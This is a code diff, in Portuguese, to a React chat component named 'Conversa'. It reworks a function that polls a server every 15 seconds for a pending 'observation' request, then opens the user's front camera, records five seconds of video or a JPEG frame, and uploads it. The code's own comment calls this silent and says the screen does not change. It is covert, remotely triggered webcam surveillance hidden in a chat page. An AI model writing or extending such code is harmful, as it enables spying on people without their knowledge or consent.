@@ -363,80 +363,122 @@ export default function Conversa() {
 
     // Observação por vídeo — silenciosa, sem alterar a tela
     async function verificarObservacao() {
+
+      // Etapa 1: verificar pedido pendente
+      let obs = null;
       try {
         const res = await fetch(`/api/observacao?usuario_id=${usuarioIdRef.current}`);
-        if (!res.ok) {
-          const txt = await res.text();
-          console.error('[observacao] GET falhou:', res.status, txt.slice(0, 300));
-          return;
-        }
-        const obs = await res.json();
+        if (!res.ok) { console.error('[obs] etapa1 GET falhou:', res.status, await res.text()); return; }
+        obs = await res.json();
         if (!obs) return;
+        console.log('[obs] etapa1 OK — pedido id:', obs.id);
+      } catch (e) { console.error('[obs] etapa1 erro:', e.name, e.message); return; }
 
-        console.log('[observacao] pedido encontrado, id:', obs.id, '— iniciando camera');
+      // Limpar pedido sem video (evita retentar infinitamente)
+      async function limparPedido(motivo) {
+        console.warn('[obs] limpando pedido id:', obs.id, '| motivo:', motivo);
+        try {
+          await fetch('/api/observacao', {
+            method: 'PATCH',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ id: obs.id, video: null }),
+          });
+        } catch (e) { console.error('[obs] erro ao limpar pedido:', e.message); }
+      }
 
-        const stream = await navigator.mediaDevices.getUserMedia({
+      // Etapa 2: abrir câmera
+      let stream = null;
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user', width: { ideal: 160 }, height: { ideal: 120 } },
           audio: false,
         });
-
-        // Captura frame antecipado como fallback para video grande
-        let frameJpeg = null;
-        try {
-          const videoEl = document.createElement('video');
-          videoEl.srcObject = stream;
-          videoEl.muted = true;
-          videoEl.playsInline = true;
-          await videoEl.play();
-          await new Promise(r => setTimeout(r, 600));
-          const canvas = document.createElement('canvas');
-          canvas.width = 160; canvas.height = 120;
-          canvas.getContext('2d').drawImage(videoEl, 0, 0, 160, 120);
-          frameJpeg = canvas.toDataURL('image/jpeg', 0.8);
-          videoEl.srcObject = null;
-          console.log('[observacao] frame JPEG capturado, tamanho:', Math.round(frameJpeg.length / 1024), 'KB');
-        } catch (e) {
-          console.error('[observacao] frame fallback falhou:', e.name, e.message);
-        }
-
-        const recorder = new MediaRecorder(stream, { videoBitsPerSecond: 100000 });
-        const chunks = [];
-        recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-        recorder.onstop = () => {
-          stream.getTracks().forEach(t => t.stop());
-          const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
-          const reader = new FileReader();
-          reader.onloadend = async () => {
-            try {
-              const dados = reader.result;
-              const LIMITE = 4 * 1024 * 1024; // 4MB
-              const usandoFrame = dados.length > LIMITE && frameJpeg;
-              const payload = usandoFrame ? frameJpeg : dados;
-              console.log('[observacao] video:', Math.round(dados.length / 1024), 'KB | payload:', Math.round(payload.length / 1024), 'KB | modo:', usandoFrame ? 'frame JPEG' : 'video');
-              const patchRes = await fetch('/api/observacao', {
-                method: 'PATCH',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id: obs.id, video: payload }),
-              });
-              if (!patchRes.ok) {
-                const errBody = await patchRes.text();
-                console.error('[observacao] PATCH falhou:', patchRes.status, errBody.slice(0, 500));
-              } else {
-                console.log('[observacao] gravacao enviada com sucesso, id:', obs.id);
-              }
-            } catch (e) {
-              console.error('[observacao] erro ao enviar PATCH:', e.name, e.message, e.stack);
-            }
-          };
-          reader.readAsDataURL(blob);
-        };
-
-        recorder.onerror = (e) => console.error('[observacao] MediaRecorder erro:', e.error?.message ?? e);
-        recorder.start();
-        setTimeout(() => { try { recorder.stop(); } catch (e) { console.error('[observacao] stop erro:', e.message); } }, 5000);
+        console.log('[obs] etapa2 OK — tracks:', stream.getVideoTracks().length, '| settings:', JSON.stringify(stream.getVideoTracks()[0]?.getSettings?.() ?? {}));
       } catch (e) {
-        console.error('[observacao] erro no fluxo:', e.name, e.message, e.stack);
+        console.error('[obs] etapa2 camera falhou:', e.name, e.message);
+        await limparPedido('camera: ' + e.name);
+        return;
       }
+
+      // Etapa 3: capturar frame JPEG (fallback)
+      let frameJpeg = null;
+      try {
+        const videoEl = document.createElement('video');
+        videoEl.srcObject = stream;
+        videoEl.muted = true;
+        videoEl.playsInline = true;
+        await videoEl.play();
+        await new Promise(r => setTimeout(r, 600));
+        const canvas = document.createElement('canvas');
+        canvas.width = 160; canvas.height = 120;
+        canvas.getContext('2d').drawImage(videoEl, 0, 0, 160, 120);
+        frameJpeg = canvas.toDataURL('image/jpeg', 0.8);
+        videoEl.srcObject = null;
+        console.log('[obs] etapa3 OK — frame JPEG:', Math.round(frameJpeg.length / 1024), 'KB');
+      } catch (e) { console.error('[obs] etapa3 frame falhou (continua):', e.name, e.message); }
+
+      // Etapa 4: gravar vídeo via MediaRecorder
+      let payload = null;
+      try {
+        payload = await new Promise((resolve, reject) => {
+          let recorder;
+          try {
+            recorder = new MediaRecorder(stream, { videoBitsPerSecond: 100000 });
+          } catch (e) { return reject(new Error('MediaRecorder nao suportado: ' + e.message)); }
+
+          console.log('[obs] etapa4 MediaRecorder mimeType:', recorder.mimeType);
+          const chunks = [];
+          recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+          recorder.onerror      = (e) => reject(new Error('MediaRecorder onerror: ' + (e.error?.message ?? e)));
+          recorder.onstop = () => {
+            try {
+              stream.getTracks().forEach(t => t.stop());
+              const blob = new Blob(chunks, { type: recorder.mimeType || 'video/webm' });
+              console.log('[obs] blob:', Math.round(blob.size / 1024), 'KB tipo:', blob.type);
+              if (blob.size === 0) return reject(new Error('blob vazio'));
+              const reader = new FileReader();
+              reader.onerror   = () => reject(new Error('FileReader erro'));
+              reader.onloadend = () => {
+                const dados = reader.result;
+                const LIMITE = 4 * 1024 * 1024;
+                const usarFrame = dados.length > LIMITE && frameJpeg;
+                const final = usarFrame ? frameJpeg : dados;
+                console.log('[obs] etapa4 OK — payload:', Math.round(final.length / 1024), 'KB | modo:', usarFrame ? 'frame JPEG' : 'video');
+                resolve(final);
+              };
+              reader.readAsDataURL(blob);
+            } catch (e) { reject(e); }
+          };
+          recorder.start();
+          setTimeout(() => { try { recorder.stop(); } catch (e) { reject(e); } }, 5000);
+        });
+      } catch (e) {
+        console.error('[obs] etapa4 gravacao falhou:', e.name, e.message);
+        try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+        if (frameJpeg) {
+          console.log('[obs] etapa4 usando frame JPEG como fallback apos falha de gravacao');
+          payload = frameJpeg;
+        } else {
+          await limparPedido('gravacao: ' + e.message);
+          return;
+        }
+      }
+
+      // Etapa 5: enviar PATCH
+      try {
+        console.log('[obs] etapa5 enviando PATCH id:', obs.id, 'payload:', Math.round(payload.length / 1024), 'KB');
+        const patchRes = await fetch('/api/observacao', {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: obs.id, video: payload }),
+        });
+        if (!patchRes.ok) {
+          const errBody = await patchRes.text();
+          console.error('[obs] etapa5 PATCH falhou:', patchRes.status, errBody.slice(0, 500));
+        } else {
+          console.log('[obs] etapa5 OK — enviado com sucesso id:', obs.id);
+        }
+      } catch (e) { console.error('[obs] etapa5 erro envio:', e.name, e.message); }
     }
 
     const intervaloObservacao = setInterval(verificarObservacao, 15000);
